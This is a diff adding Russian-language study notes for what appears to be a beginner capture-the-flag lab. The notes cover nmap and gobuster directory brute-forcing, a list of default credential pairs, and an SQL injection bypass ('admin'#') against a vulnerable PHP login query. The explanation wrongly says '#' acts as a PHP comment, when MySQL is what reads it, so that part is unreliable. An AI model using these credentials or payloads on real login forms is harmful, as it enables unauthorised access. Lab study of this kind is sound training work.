@@ -1,0 +1,133 @@
+*** APPOINTMENT 
+
+### SQL - STRUCTURED QUERY LANGUAGE 
+
+	- Язык структурированных запросов
+
+
+	# Какой тип уязвимостей SQL является одним 
+	из наиболее распространенных
+	
+		- SQL-injection
+
+	# Что означает PII
+	
+		- Personal Indentify Infrormation
+
+	# Как в списке OWASP TOP 10 называется классификация
+	уязвимости SQL-onjection
+		
+		- A03:2021-injection
+
+	# Машина в текущем задании работат на 80 порту и использует
+	службу:
+	
+		nmap {target-ip} -sC -sV 	
+		- Apache httpd 2.4.38 ((Debian))
+
+	# Стандартный порт протокола HTTPS
+		
+		- 443
+
+	# Какой один основанный на удаче метод эксплуатации страниц входа
+		
+		- bruteforcing
+
+	# Какой код ответа для ошибок "Not Found"
+
+		- 404
+
+		= 200 OK : Page exists 
+	 	= 404 Not found : Page/resourse does not exists
+		= 302 Page/resourse found, but by rediraction to another directory
+
+
+
+	### GOBUSTER
+	Утилита на языке GOLANG, использующаяся для атак типа brute-forcing
+
+		
+		# Installation
+			
+			@ sudo pacman -S go 
+				
+				# перед началом установки gobuster необходимо установить GO
+
+			@ git clone https://github.com/OJ/gobuster.git 
+
+				# репозиторий GOBUSTER 
+
+			@ cd gobuster
+			@ make linux
+			@ make test
+			
+			@ git clone https://github.com/danielmiessler/SecLists.git 
+
+				# wordlists for gobuster 			
+			
+		
+		### Using GOBUSTER
+
+			
+			@ gobuster dir --url http://scanme.nmap.org/ \
+				--wordlist {wordlist_location}/SecLists/Discovery/Web-Content
+
+				# перебирает по словарю возможных директорий и отправляет GET 
+				запросы на смодерированные URL-адреса 
+
+		
+		### IF WAS NOT FOUND DIRS 
+
+			# Если GOBUSTER не нашел ни одной полезной диррктории, то следует
+			обеспечить FOOTHOLD (ПЛАЦДАРМ)
+
+			# ПЛАЦДАРМ: проверить стандартные пароли в форме авторизации
+			
+				http://{host_ip}:8080 
+
+				admin:admin
+				guest:guest
+				user:user
+				root:root
+				administrator:password 
+
+		### IF IS NO ONE PASSWORD CORRECT 
+
+			# Если ни один логин и пароль не подошел к форме авторизации
+			тогда можно попытаться использовать SQL-injection 
+
+			# SQL-injection on PHP form:
+				
+				PHP форма имеет код 
+				--------------------
+				$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+				$result=mysql_query($sql);
+				$count=mysql_num_rows($result);
+				if ($count==1) {...} 
+
+			# Так как в PHP комментарий начинается после символа ( # )
+			эксплутируем явную уязвимость данного кода 
+				
+				$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+
+				- Если подставить в колонку с логином значение: 
+					
+					admin'# 
+
+				то переменная $username будет иметь значение = admin'# и 
+				запрос будет выглядеть уже по другому 
+
+					@sql = "SELECT * FROM users WHERE username='admin'#' AND password=''";
+						
+				 В PHP после # код транслироваться не будет, а значит
+					
+					@result=mysql_query("SELECT * FROM users WHERE username='admin'")
+
+		### CATCH YOUR FLAG !!!!!				
+
+			
+				
+
+
+
+
